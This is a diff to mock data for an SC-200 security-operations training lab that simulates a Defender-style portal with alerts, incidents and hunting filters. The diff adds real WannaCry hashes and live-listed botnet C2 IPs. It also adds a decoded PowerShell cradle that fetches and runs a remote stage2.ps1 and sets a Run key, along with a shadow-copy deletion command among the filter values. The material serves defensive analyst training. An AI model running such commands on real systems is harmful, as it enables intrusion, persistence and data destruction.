@@ -1,8 +1,53 @@
-// SC-200_lab mock data. All data is fictional and lives in-memory.
+// SC-200_lab mock data. Scenarios, users, and hostnames are fictional.
+//
+// INDICATORS ARE REAL. Every hash, IP, and JA3 below was pulled from a public
+// source and verified on 2026-08-02 — see IOC_PROVENANCE for the per-indicator
+// citation. They are inert strings: nothing in this lab resolves, fetches, or
+// connects to any of them. They are real so that you can practise the actual
+// analyst loop — paste an indicator into VirusTotal, MalwareBazaar, ThreatFox,
+// or CIRCL hashlookup and get a genuine verdict back.
+//
+// Re-verify before trusting an enrichment result: feed listings age out, and an
+// IP that is a live C2 today may be reassigned to something innocent later.
 
-const KNOWN_GOOD_HASH  = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
-const POST_UPDATE_HASH = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
-const ROGUE_HASH       = 'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
+// --- File hashes -----------------------------------------------------------
+// Known-good pair: Nmap's own vendor-published installer digests. Defender
+// genuinely detects Nmap as HackTool:Win32/Nmap, which is why a SOC would
+// suppress it. 7.98 -> 7.99 is a REAL hash drift across a vendor update, and it
+// is the whole point of the A001-A005 lesson: a rule pinned to a SHA256 breaks
+// the moment the vendor ships a new build.
+const KNOWN_GOOD_HASH  = '5a52826b45600c34662012cc70f35df8dde590b83c14d0f3c7be04bbb4087d32'; // nmap-7.98-setup.exe
+const POST_UPDATE_HASH = 'fda839f35d9f8f18a11670e17d0332ce9d05a3556c5a20e91b0b56c57774f611'; // nmap-7.99-setup.exe
+
+// Confirmed-malicious. WannaCry dropper, planted under a trusted tool's file
+// name to illustrate masquerading (T1036.005). Verified KnownMalicious.
+const ROGUE_HASH       = '24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c';
+
+// WannaCry encryptor — the canonical 2017 sample (MD5 84c82835a5d21bbcf75a...).
+// Pairs with ROGUE_HASH: dropper on WKS-03, encryptor on the file server.
+const RANSOMWARE_HASH  = 'ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa';
+
+// EICAR anti-malware test file. Harmless by design, universally detected, and
+// reproducible: printf 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+const EICAR_HASH       = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';
+
+// --- Network indicators ----------------------------------------------------
+const TOR_EXIT_IP      = '185.220.101.44';  // real Tor exit relay (netname TOR-EXIT)
+const QAKBOT_C2_IP     = '50.16.16.211';    // Feodo Tracker: QakBot C2, port 443
+const EMOTET_C2_IP     = '162.243.103.246'; // Feodo Tracker: Emotet C2, port 8080
+
+// Where each indicator came from, so a verdict can be re-checked rather than
+// taken on faith. Rendered in the alert detail pane.
+const IOC_PROVENANCE = {
+  [KNOWN_GOOD_HASH]:  { verdict:'Known good (vendor-signed)', source:'nmap.org/dist/sigs/nmap-7.98-setup.exe.digest.txt', note:'Publisher-published digest for Nmap 7.98.' },
+  [POST_UPDATE_HASH]: { verdict:'Known good (vendor-signed)', source:'nmap.org/dist/sigs/nmap-7.99-setup.exe.digest.txt', note:'Same product, next release. Hash differs — this is the drift.' },
+  [ROGUE_HASH]:       { verdict:'Malicious', source:'CIRCL hashlookup -> KnownMalicious (malshare.com)', note:'WannaCry dropper. Real sample; renamed here to show masquerading.' },
+  [RANSOMWARE_HASH]:  { verdict:'Malicious', source:'CIRCL hashlookup -> KnownMalicious (malshare.com)', note:'WannaCry encryptor, MD5 84c82835a5d21bbcf75a61706d8ab549.' },
+  [EICAR_HASH]:       { verdict:'Malicious (test file)', source:'CIRCL hashlookup -> FileName eicar.com, 68 bytes', note:'Not malware. Standard AV test string — safe to reproduce yourself.' },
+  [TOR_EXIT_IP]:      { verdict:'Anonymising infrastructure', source:'RIPE whois -> netname TOR-EXIT', note:'Tor exit relay. Suspicious as a destination, not proof of compromise.' },
+  [QAKBOT_C2_IP]:     { verdict:'Malicious (botnet C2)', source:'Feodo Tracker ipblocklist -> QakBot', note:'Listed as QakBot C2 on 443. Hosted on cloud IP space.' },
+  [EMOTET_C2_IP]:     { verdict:'Malicious (botnet C2)', source:'Feodo Tracker ipblocklist -> Emotet', note:'Listed as Emotet C2 on 8080.' },
+};
 
 const SEED_ALERTS = [
   { id:'A001', severity:'medium', title:'Suspicious activity by vulnerability scanner',
@@ -56,7 +101,7 @@ const SEED_ALERTS = [
   { id:'A301', severity:'high', title:'Multiple endpoints encrypted by suspected ransomware',
     status:'New', category:'Impact', detectionSource:'MDE', asset:'FIN-FS-02',
     firstActivity:'2026-06-28T10:18:00Z', incidentId:'INC-1050',
-    event:{ file_name:'locker.exe', sha256:'dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd',
+    event:{ file_name:'locker.exe', sha256:'7a64529e93fa01e8cedfc02114f397d4bbbb42715349f24763d3b7765ffed466',
             path:'C:\\ProgramData\\locker.exe', ransom_note:'RECOVER-FILES.txt' } },
   { id:'A302', severity:'high', title:'Shadow copy deletion followed by mass file rename',
     status:'New', category:'Impact', detectionSource:'MDE', asset:'FIN-FS-02',
@@ -78,6 +123,88 @@ const SEED_ALERTS = [
     status:'New', category:'Exfiltration', detectionSource:'Defender for Cloud', asset:'aws-s3-prod-logs',
     firstActivity:'2026-06-28T07:52:00Z', incidentId:'INC-1054',
     event:{ account:'aws-prod', bucket:'aws-s3-prod-logs', acl:'public-read', finding:'External principals can list objects' } },
+  { id:'A801', severity:'high', title:'A suspicious PowerShell command line was run',
+    status:'New', category:'Execution', detectionSource:'MDE', asset:'FIN-WKS-07',
+    firstActivity:'2026-06-28T16:20:00Z', incidentId:'INC-1055',
+    event:{ file_name:'invoice_update.ps1', initiating_process:'winword.exe',
+            cmdline:'powershell.exe -nop -w hidden -EncodedCommand JABjAD0ATgBlAHcA...(truncated)',
+            user:'contoso\\j.reyes', device:'FIN-WKS-07' },
+    note:'This is the script-triggered incident. Open the alert, then use "Analyze script" to reach the embedded script analysis and Show MITRE techniques.',
+    scriptAnalysis:{
+      fileName:'invoice_update.ps1',
+      spawnedBy:'winword.exe',
+      verdict:'Malicious',
+      summary:'Automated script analysis decoded the Base64 -EncodedCommand payload and flagged it as malicious.',
+      decoded:[
+        '$c = New-Object Net.WebClient',
+        "$c.Headers.Add('User-Agent','Mozilla/5.0')",
+        "$p = $c.DownloadString('http://185.220.101.44/a/stage2.ps1')",
+        'Invoke-Expression $p',
+        "Set-ItemProperty 'HKCU:\\...\\Run' Updater 'powershell -w hidden -enc <b64>'",
+      ],
+      findings:[
+        'Runs with -EncodedCommand and -w hidden to obscure intent.',
+        'Downloads and executes a second-stage payload from a remote host (185.220.101.44).',
+        'Uses Invoke-Expression to run downloaded code in memory.',
+        'Writes an HKCU ...\\Run registry value to persist across reboots.',
+      ],
+      // Grouped by ATT&CK tactic; revealed by the "Show MITRE techniques" control.
+      techniques:[
+        { tactic:'Execution', id:'T1059.001', name:'Command and Scripting Interpreter: PowerShell',
+          detail:'Encoded PowerShell command spawned from winword.exe.' },
+        { tactic:'Defense Evasion', id:'T1027', name:'Obfuscated Files or Information',
+          detail:'Base64 -EncodedCommand payload and a hidden window (-w hidden).' },
+        { tactic:'Defense Evasion', id:'T1140', name:'Deobfuscate/Decode Files or Information',
+          detail:'Decodes the encoded command at runtime before execution.' },
+        { tactic:'Command and Control', id:'T1105', name:'Ingress Tool Transfer',
+          detail:'Downloads stage2.ps1 from a remote host.' },
+        { tactic:'Command and Control', id:'T1071.001', name:'Application Layer Protocol: Web Protocols',
+          detail:'HTTP retrieval with a spoofed User-Agent string.' },
+        { tactic:'Persistence', id:'T1547.001', name:'Registry Run Keys / Startup Folder',
+          detail:'Adds an HKCU ...\\Run value to relaunch at logon.' },
+      ],
+    } },
+  { id:'A901', severity:'low', title:'Password spray attempt blocked by identity protection',
+    status:'New', category:'Credential access', detectionSource:'Entra ID Protection', asset:'liam.chen@contoso.com',
+    firstActivity:'2026-06-28T16:34:00Z', incidentId:'INC-1060',
+    event:{ user:'liam.chen@contoso.com', source_ip:'203.0.113.74', attempts:8,
+            result:'Blocked by smart lockout', risk_level:'Low' },
+    note:'The sign-in was blocked, but the source and targeted account still warrant quick scoping.' },
+  { id:'A1001', severity:'low', title:'Potentially unwanted application was quarantined',
+    status:'In progress', category:'Execution', detectionSource:'MDE', asset:'HR-WKS-04',
+    firstActivity:'2026-06-28T16:46:00Z', incidentId:'INC-1061',
+    event:{ file_name:'coupon-helper.exe', sha256:'c98e7f6f190c5722277ebd650852486d81087aebf779b09b2411c882db318413',
+            path:'C:\\Users\\Public\\Downloads\\coupon-helper.exe', action:'Quarantined' } },
+  { id:'A1101', severity:'low', title:'External mailbox forwarding rule detected and disabled',
+    status:'New', category:'Persistence', detectionSource:'MDO', asset:'nina.patel@contoso.com',
+    firstActivity:'2026-06-28T17:02:00Z', incidentId:'INC-1062',
+    event:{ user:'nina.patel@contoso.com', rule_name:'Forward invoices', destination:'archive-mail@external.example',
+            action:'Rule disabled automatically' } },
+  { id:'A1201', severity:'low', title:'Repeated anonymous storage probes were denied',
+    status:'New', category:'Discovery', detectionSource:'Defender for Cloud', asset:'stfinancearchive',
+    firstActivity:'2026-06-28T17:18:00Z', incidentId:'INC-1063',
+    event:{ storage_account:'stfinancearchive', source_ip:'198.51.100.62', requests:19,
+            result:'Denied by private endpoint policy' } },
+  { id:'A1301', severity:'informational', title:'Safe Links blocked a phishing URL before user access',
+    status:'Resolved', category:'Initial access', detectionSource:'MDO', asset:'evan.brooks@contoso.com',
+    firstActivity:'2026-06-28T17:31:00Z', incidentId:'INC-1064',
+    event:{ user:'evan.brooks@contoso.com', subject:'Updated payroll calendar',
+            url:'https://payroll-calendar[.]example/signin', action:'Blocked before click-through' } },
+  { id:'A1401', severity:'informational', title:'Privileged role activation matched approved PIM request',
+    status:'Resolved', category:'Privilege escalation', detectionSource:'Entra ID Protection', asset:'olivia.kim@contoso.com',
+    firstActivity:'2026-06-28T17:44:00Z', incidentId:'INC-1065',
+    event:{ user:'olivia.kim@contoso.com', role:'Security Administrator', duration:'45 minutes',
+            approval:'CHG-4821 / approved' } },
+  { id:'A1501', severity:'informational', title:'OAuth consent granted to verified publisher application',
+    status:'New', category:'Persistence', detectionSource:'MDA', asset:'alex.wong@contoso.com',
+    firstActivity:'2026-06-28T17:56:00Z', incidentId:'INC-1066',
+    event:{ user:'alex.wong@contoso.com', app_name:'Contoso Travel', publisher:'Verified',
+            permissions:'User.Read, Calendars.Read', consent_policy:'Allowed' } },
+  { id:'A1601', severity:'informational', title:'Office child process observed in ASR audit mode',
+    status:'New', category:'Execution', detectionSource:'MDE', asset:'MKT-WKS-11',
+    firstActivity:'2026-06-28T18:09:00Z', incidentId:'INC-1067',
+    event:{ parent_process:'winword.exe', process:'cmd.exe', document:'Q3-campaign-template.docm',
+            asr_mode:'Audit', signer:'Contoso Marketing Automation' } },
 ];
 
 const INCIDENTS = [
@@ -150,6 +277,60 @@ const INCIDENTS = [
     entities:[{type:'Storage',name:'aws-s3-prod-logs'},{type:'Cloud account',name:'aws-prod'}],
     createdAt:'2026-06-28T07:53:00Z', alertCount:1,
     summary:'Public-read ACL on a log bucket exposes production telemetry. Remove public access, review object access, and add guardrail policy.' },
+  { id:'INC-1055', severity:'high', title:'Suspicious PowerShell script execution on FIN-WKS-07',
+    status:'New', assignedTo:'Unassigned', classification:'',
+    tactics:['Execution','Defense Evasion','Command and Control','Persistence'], alertIds:['A801'],
+    entities:[{type:'Device',name:'FIN-WKS-07'},{type:'User',name:'j.reyes@contoso.com'},{type:'File',name:'invoice_update.ps1'}],
+    createdAt:'2026-06-28T16:21:00Z', alertCount:1,
+    summary:'An encoded PowerShell script spawned by Word downloaded a second-stage payload and set a Run key. Open the alert to analyze the script and view its MITRE ATT&CK techniques.' },
+  { id:'INC-1060', severity:'low', title:'Blocked password spray against single user',
+    status:'New', assignedTo:'L1-Triage', classification:'',
+    tactics:['Credential Access'], alertIds:['A901'],
+    entities:[{type:'User',name:'liam.chen@contoso.com'},{type:'IP',name:'203.0.113.74'}],
+    createdAt:'2026-06-28T16:35:00Z', alertCount:1,
+    summary:'Smart lockout blocked a small password-spray burst. Check whether the source targeted other users, then close as prevented if no successful sign-in exists.' },
+  { id:'INC-1061', severity:'low', title:'Potentially unwanted application on HR workstation',
+    status:'In progress', assignedTo:'endpoint-queue', classification:'',
+    tactics:['Execution'], alertIds:['A1001'],
+    entities:[{type:'Device',name:'HR-WKS-04'},{type:'File',name:'coupon-helper.exe'}],
+    createdAt:'2026-06-28T16:47:00Z', alertCount:1,
+    summary:'Defender quarantined a bundled browser helper. Validate the download source and confirm that no related persistence or credential access followed.' },
+  { id:'INC-1062', severity:'low', title:'Suspicious external mailbox forwarding rule',
+    status:'New', assignedTo:'messaging-sec', classification:'',
+    tactics:['Persistence','Collection'], alertIds:['A1101'],
+    entities:[{type:'User',name:'nina.patel@contoso.com'},{type:'Mailbox rule',name:'Forward invoices'},{type:'Email',name:'archive-mail@external.example'}],
+    createdAt:'2026-06-28T17:03:00Z', alertCount:1,
+    summary:'An external forwarding rule was disabled automatically. Confirm whether the user created it and review recent sign-ins and mailbox activity before closure.' },
+  { id:'INC-1063', severity:'low', title:'Denied anonymous probes against finance storage',
+    status:'New', assignedTo:'cloud-sec', classification:'',
+    tactics:['Discovery'], alertIds:['A1201'],
+    entities:[{type:'Storage',name:'stfinancearchive'},{type:'IP',name:'198.51.100.62'}],
+    createdAt:'2026-06-28T17:19:00Z', alertCount:1,
+    summary:'A public source repeatedly tested a private storage endpoint and received only denied responses. Validate policy coverage and search for the source across other cloud assets.' },
+  { id:'INC-1064', severity:'informational', title:'Phishing URL blocked before user access',
+    status:'Resolved', assignedTo:'MDO-Automation', classification:'Benign positive',
+    tactics:['Initial Access'], alertIds:['A1301'],
+    entities:[{type:'User',name:'evan.brooks@contoso.com'},{type:'URL',name:'payroll-calendar[.]example'}],
+    createdAt:'2026-06-28T17:32:00Z', alertCount:1,
+    summary:'Safe Links blocked the destination before the user could open it. The incident preserves the prevention evidence for campaign scoping and reporting.' },
+  { id:'INC-1065', severity:'informational', title:'Approved privileged role activation',
+    status:'Resolved', assignedTo:'identity-automation', classification:'Expected activity',
+    tactics:['Privilege Escalation'], alertIds:['A1401'],
+    entities:[{type:'User',name:'olivia.kim@contoso.com'},{type:'Role',name:'Security Administrator'},{type:'Change',name:'CHG-4821'}],
+    createdAt:'2026-06-28T17:45:00Z', alertCount:1,
+    summary:'A time-bound privileged role activation matched its approved change request. Retain the record as an informational audit trail.' },
+  { id:'INC-1066', severity:'informational', title:'Verified publisher OAuth consent review',
+    status:'New', assignedTo:'Unassigned', classification:'',
+    tactics:['Persistence'], alertIds:['A1501'],
+    entities:[{type:'User',name:'alex.wong@contoso.com'},{type:'App',name:'Contoso Travel'}],
+    createdAt:'2026-06-28T17:57:00Z', alertCount:1,
+    summary:'A user granted low-impact delegated permissions to a verified application under the tenant consent policy. Confirm business need and publisher identity.' },
+  { id:'INC-1067', severity:'informational', title:'Office child process recorded in ASR audit mode',
+    status:'New', assignedTo:'detection-eng', classification:'',
+    tactics:['Execution'], alertIds:['A1601'],
+    entities:[{type:'Device',name:'MKT-WKS-11'},{type:'Process',name:'cmd.exe'},{type:'File',name:'Q3-campaign-template.docm'}],
+    createdAt:'2026-06-28T18:10:00Z', alertCount:1,
+    summary:'An Office child-process event was logged by an ASR rule in audit mode. Validate the signed marketing automation before deciding whether the rule can move to block mode.' },
 ];
 
 const MDE_SETTINGS = {
@@ -214,7 +395,7 @@ const AIR_INVESTIGATIONS = [
 ];
 
 const INCIDENT_INVESTIGATION_GUIDE = {
-  source:'Microsoft Learn: Investigate incidents in the Microsoft Defender portal',
+  source:'Product documentation: Investigate incidents in the Defender portal',
   lastUpdated:'2026-03-11',
   workflow:[
     { title:'Initial investigation',
@@ -245,7 +426,7 @@ const INCIDENT_INVESTIGATION_GUIDE = {
       detail:'Compare incidents with similar alerts, entities, or properties to assess campaign scope and whether related cases should be handled together.' },
   ],
   blastRadius:{
-    prerequisites:['Microsoft Sentinel data lake onboarding','Exposure management read permission or higher'],
+    prerequisites:['Sentinel data lake onboarding','Exposure management read permission or higher'],
     notes:[
       'Replaces attack path analysis in the incident experience.',
       'Shows possible paths, not guaranteed attacker movement.',
@@ -263,7 +444,7 @@ const INCIDENT_INVESTIGATION_GUIDE = {
 };
 
 // ---- Per-incident enrichment: activities, evidence, summary, similar, blast paths ----
-// Sourced from MS Learn: Investigate incidents in the Microsoft Defender portal.
+// Sourced from MS Learn: Investigate incidents in the Defender portal.
 // Each entry is keyed by incident id; renderIncidentDetail falls back to a generic
 // template when an incident is not listed here.
 
@@ -678,7 +859,7 @@ const ATTACK_STORIES = {
         verdict:'Bypassed', remediation:'Require phishing-resistant MFA for finance group.' },
       { id:'sign-in', type:'Sign-in', label:'06:41 sign-in event', ring:1,
         verdict:'Risky', remediation:'Mark user high-risk in Identity Protection.' },
-      { id:'phish-page', type:'URL', label:'login-microsoft[.]click', ring:1,
+      { id:'phish-page', type:'URL', label:'login-cloud[.]click', ring:1,
         verdict:'Malicious', remediation:'Tenant-block; sweep clickers from email logs.' },
       { id:'sharepoint', type:'SharePoint site', label:'Finance SharePoint', ring:2,
         verdict:'At risk', remediation:'Audit doc access for last 4h.' },
@@ -839,7 +1020,7 @@ const THREAT_REPORTS = [
     summary:'State-aligned actor targeting M365 admins via device-code phishing into OAuth consent grants.',
     overview:['The report connects phishing, OAuth consent, and Graph mailbox access into one investigation path.','The lab tenant has one matching incident: Jane Doe granting DocViewer Pro mail and file scopes.'],
     analystReport:['OAuth persistence survives password reset until consent and refresh tokens are revoked.','Graph activity logs help confirm whether the app enumerated messages, files, or directory objects after consent.'],
-    recommendations:['Revoke DocViewer Pro consent and Jane Doe sessions.','Query CloudAppEvents and MicrosoftGraphActivityLogs for the app ID.','Review app governance for unverified publishers requesting mail write scopes.'] },
+    recommendations:['Revoke DocViewer Pro consent and Jane Doe sessions.','Query CloudAppEvents and GraphActivityLogs for the app ID.','Review app governance for unverified publishers requesting mail write scopes.'] },
   { id:'TR-003', name:'AiTM phishing kits (Tycoon 2FA)', type:'Tool', status:'Active campaign',
     impactedAssets:2, severity:'medium', relatedIncidents:['INC-1051','INC-1053'], exposure:'2 risky sign-ins, 1 MFA-proxied session, 1 blocked Azure Portal attempt',
     summary:'Adversary-in-the-middle phishing pages proxy MFA prompts and steal session cookies; bypasses non-FIDO MFA.',
@@ -862,13 +1043,13 @@ const HUNTING_TABLES = ['AlertEvidence','AlertInfo','CloudAppEvents','DeviceEven
   'DeviceTvmSoftwareVulnerabilities','DeviceTvmSoftwareVulnerabilitiesKB',
   'EmailAttachmentInfo','EmailEvents','EmailPostDeliveryEvents','EmailUrlInfo','UrlClickEvents',
   'IdentityDirectoryEvents','IdentityInfo','IdentityLogonEvents','IdentityQueryEvents',
-  'MicrosoftGraphActivityLogs','OAuthAppInfo','SigninLogs','ContainerEvents'];
+  'GraphActivityLogs','OAuthAppInfo','SigninLogs','ContainerEvents'];
 
 const HUNTING_SCHEMA_GROUPS = [
   { name:'Alerts', tables:['AlertInfo','AlertEvidence'] },
   { name:'Apps & identities',
     tables:['IdentityInfo','IdentityLogonEvents','IdentityQueryEvents',
-      'IdentityDirectoryEvents','CloudAppEvents','MicrosoftGraphActivityLogs','OAuthAppInfo'] },
+      'IdentityDirectoryEvents','CloudAppEvents','GraphActivityLogs','OAuthAppInfo'] },
   { name:'Email',
     tables:['EmailEvents','EmailAttachmentInfo','EmailUrlInfo',
       'EmailPostDeliveryEvents','UrlClickEvents'] },
@@ -880,6 +1061,149 @@ const HUNTING_SCHEMA_GROUPS = [
     tables:['DeviceTvmSoftwareInventory','DeviceTvmSoftwareVulnerabilities',
       'DeviceTvmSoftwareVulnerabilitiesKB','DeviceTvmSecureConfigurationAssessment',
       'DeviceTvmSecureConfigurationAssessmentKB'] },
+];
+
+// Guided hunting (query builder). Mirrors advanced hunting guided mode: pick a
+// data domain, then build conditions from dropdowns instead of writing KQL.
+// Basic filters are AND-only; the All filters toggle unlocks the full set plus
+// OR grouping, matching the product. Filter columns and their suggested values
+// are drawn from the bundled fixtures so a built query actually returns rows.
+const GUIDED_HUNTING_DOMAINS = [
+  { id:'all',       label:'All domains',             hint:'Look through all available data in your query.' },
+  { id:'endpoints', label:'Endpoints',               hint:'Endpoint data as provided by Microsoft Defender for Endpoint.' },
+  { id:'email',     label:'Email and collaboration', hint:'Email and collaboration app data. Same data Threat explorer users know.' },
+  { id:'apps',      label:'Apps and identities',     hint:'Data from Defender for Cloud Apps and Defender for Identity.' },
+  { id:'cloud',     label:'Cloud infrastructure',    hint:'Cloud infrastructure data as provided by Microsoft Defender for Cloud.' },
+  { id:'exposure',  label:'Exposure management',     hint:'Data as provided by Microsoft Security Exposure Management.' },
+];
+
+// Operators offered per column type. Every one of these is understood by the
+// bundled mock KQL evaluator, so guided queries stay runnable.
+const GUIDED_HUNTING_OPERATORS = {
+  string: ['==', '!=', 'contains', 'startswith', 'endswith', 'has'],
+  number: ['==', '!=', '>', '<', '>=', '<='],
+  bool:   ['==', '!='],
+};
+
+// Sections ending in "info" hold entity-state filters; sections ending in
+// "events" hold monitored-event filters — the same split the product uses.
+const GUIDED_HUNTING_FILTERS = [
+  // --- Endpoints -----------------------------------------------------------
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'FileName', label:'File name', type:'string', basic:true,
+    values:['vssadmin.exe','locker.exe','scanner.exe'] },
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'AccountName', label:'Account name', type:'string', basic:true,
+    values:['jdoe','svc-scan','fin-svc'] },
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'DeviceName', label:'Device name', type:'string', basic:true,
+    values:['WKS-01','WKS-02','WKS-03','FIN-FS-02'] },
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'FolderPath', label:'Folder path', type:'string', basic:false,
+    values:['C:\\Users\\Public\\scanner.exe','C:\\Windows\\System32\\vssadmin.exe','C:\\ProgramData\\locker.exe'] },
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'ProcessCommandLine', label:'Process command line', type:'string', basic:false,
+    values:['vssadmin delete shadows /all /quiet','locker.exe --encrypt --shares'] },
+  { domain:'endpoints', section:'Device process events', table:'DeviceProcessEvents',
+    column:'AttackTechniques', label:'Attack techniques', type:'string', basic:false,
+    values:['T1036','T1490','T1486','T1595'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'ActionType', label:'Action type', type:'string', basic:true,
+    values:['LogonSuccess','LogonFailed'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'LogonType', label:'Logon type', type:'string', basic:true,
+    values:['Interactive','Network','RemoteInteractive'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'AccountName', label:'Account name', type:'string', basic:false,
+    values:['svc-backup','fin-svc','jdoe'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'Protocol', label:'Protocol', type:'string', basic:false,
+    values:['Kerberos','NTLM'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'IsLocalAdmin', label:'Is local admin', type:'bool', basic:false,
+    values:['true','false'] },
+  { domain:'endpoints', section:'Device logon events', table:'DeviceLogonEvents',
+    column:'RemoteIP', label:'Remote IP', type:'string', basic:false,
+    values:['10.20.4.55','10.20.7.14'] },
+  { domain:'endpoints', section:'Device network events', table:'DeviceNetworkEvents',
+    column:'RemoteIP', label:'Remote IP', type:'string', basic:true,
+    values:['185.199.111.12'] },
+  { domain:'endpoints', section:'Device network events', table:'DeviceNetworkEvents',
+    column:'RemotePort', label:'Remote port', type:'number', basic:false,
+    values:['443','80'] },
+  { domain:'endpoints', section:'Device info', table:'DeviceInfo',
+    column:'OSPlatform', label:'OS platform', type:'string', basic:true,
+    values:['Windows 11 Enterprise','Windows Server 2022'] },
+  { domain:'endpoints', section:'Device info', table:'DeviceInfo',
+    column:'IsInternetFacing', label:'Is internet facing', type:'bool', basic:false,
+    values:['true','false'] },
+
+  // --- Apps and identities -------------------------------------------------
+  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
+    column:'ActionType', label:'Action type', type:'string', basic:true,
+    values:['LogonSuccess','LogonFailed','DirectoryServicesReplication'] },
+  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
+    column:'AccountUpn', label:'Account UPN', type:'string', basic:true,
+    values:['svc-backup@contoso.com','fin-svc@contoso.com','jane.doe@contoso.com'] },
+  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
+    column:'Protocol', label:'Protocol', type:'string', basic:false,
+    values:['Kerberos','NTLM'] },
+  { domain:'apps', section:'Identity logon events', table:'IdentityLogonEvents',
+    column:'IPAddress', label:'IP address', type:'string', basic:false,
+    values:['10.20.4.55','10.20.7.14','10.20.7.42'] },
+  { domain:'apps', section:'Cloud app events', table:'CloudAppEvents',
+    column:'ActionType', label:'Action type', type:'string', basic:true,
+    values:['Consent to application','PutBucketAcl'] },
+  { domain:'apps', section:'Cloud app events', table:'CloudAppEvents',
+    column:'AccountDisplayName', label:'Account display name', type:'string', basic:false,
+    values:['Jane Doe','aws-prod-breakglass'] },
+  { domain:'apps', section:'Sign-in logs', table:'SigninLogs',
+    column:'RiskLevel', label:'Risk level', type:'string', basic:true,
+    values:['High','Medium','Low'] },
+  { domain:'apps', section:'Sign-in logs', table:'SigninLogs',
+    column:'UserPrincipalName', label:'User principal name', type:'string', basic:false,
+    values:['sam.lee@contoso.com','maria.ross@contoso.com'] },
+
+  // --- Cloud infrastructure ------------------------------------------------
+  { domain:'cloud', section:'Container events', table:'ContainerEvents',
+    column:'ClusterName', label:'Cluster name', type:'string', basic:true, values:['aks-prod'] },
+  { domain:'cloud', section:'Container events', table:'ContainerEvents',
+    column:'Image', label:'Image', type:'string', basic:true, values:['contoso/api:2026.06'] },
+  { domain:'cloud', section:'Container events', table:'ContainerEvents',
+    column:'Syscall', label:'Syscall', type:'string', basic:false, values:['setns'] },
+
+  // --- Exposure management -------------------------------------------------
+  { domain:'exposure', section:'Device info', table:'DeviceInfo',
+    column:'ExposureLevel', label:'Exposure level', type:'string', basic:true,
+    values:['High','Medium','Low'] },
+  { domain:'exposure', section:'Device info', table:'DeviceInfo',
+    column:'IsInternetFacing', label:'Is internet facing', type:'bool', basic:true,
+    values:['true','false'] },
+  { domain:'exposure', section:'Device info', table:'DeviceInfo',
+    column:'PublicIP', label:'Public IP', type:'string', basic:false,
+    values:['198.51.100.41'] },
+];
+
+// Sample queries offered by the Load sample queries dropdown. Each is expressed
+// as builder state so loading one shows how the conditions map to KQL.
+const GUIDED_HUNTING_SAMPLES = [
+  { id:'shadow-copy', domain:'endpoints', label:'Shadow copy deletion attempts',
+    table:'DeviceProcessEvents', join:'and',
+    conditions:[{ column:'FileName', op:'==', value:'vssadmin.exe' }] },
+  { id:'failed-logons', domain:'endpoints', label:'Failed logons by logon type',
+    table:'DeviceLogonEvents', join:'and',
+    conditions:[{ column:'ActionType', op:'==', value:'LogonFailed' }] },
+  { id:'public-folder-exec', domain:'endpoints', label:'Execution from a public folder',
+    table:'DeviceProcessEvents', join:'and',
+    conditions:[{ column:'FolderPath', op:'startswith', value:'C:\\Users\\Public' }] },
+  { id:'internet-facing', domain:'exposure', label:'Internet-facing devices at high exposure',
+    table:'DeviceInfo', join:'and',
+    conditions:[{ column:'IsInternetFacing', op:'==', value:'true' },
+                { column:'ExposureLevel', op:'==', value:'High' }] },
+  { id:'ntlm-logons', domain:'apps', label:'NTLM identity logons (Kerberos fallback)',
+    table:'IdentityLogonEvents', join:'and',
+    conditions:[{ column:'ActionType', op:'==', value:'LogonSuccess' },
+                { column:'Protocol', op:'==', value:'NTLM' }] },
 ];
 
 const HUNTING_SCHEMA_NOTES = [
@@ -921,31 +1245,114 @@ const CUSTOM_DETECTION_SAMPLE = {
 | where count_ > 5`,
 };
 
+// Fictional local-only exposure graph used by the interactive hunting graph lab.
+// Scenario names and input shapes track the current Product documentation workflow;
+// entities and relationships are deliberately invented for this simulator.
+const HUNTING_GRAPH_ENTITIES = [
+  { id:'guest-kim', type:'External user', label:'kim@fabrikam.example', risk:'medium', internet:true, riskScore:true, detail:'Guest account with a project-scoped cloud role.' },
+  { id:'user-jane', type:'User', label:'jane.doe@contoso.com', risk:'high', riskScore:true, detail:'Finance analyst linked to the OAuth-consent investigation.' },
+  { id:'user-alex', type:'User', label:'alex.wilber@contoso.com', risk:'low', detail:'Developer with inherited repository and storage access.' },
+  { id:'user-helpdesk', type:'User', label:'lee.helpdesk@contoso.com', risk:'medium', vulnerable:true, riskScore:true, detail:'Helpdesk identity with password-reset delegation.' },
+  { id:'user-tier0', type:'Sensitive identity', label:'admin.tier0@contoso.com', risk:'high', critical:true, sensitive:true, riskScore:true, detail:'Tier 0 administrator protected as a sensitive identity.' },
+  { id:'user-asrep', type:'User', label:'legacy.batch@contoso.com', risk:'high', vulnerable:true, riskScore:true, detail:'Legacy account with Kerberos preauthentication disabled.' },
+  { id:'user-hybrid', type:'Hybrid user', label:'svc.sync.owner@contoso.com', risk:'medium', critical:true, riskScore:true, detail:'Synced account that owns a privileged OAuth application.' },
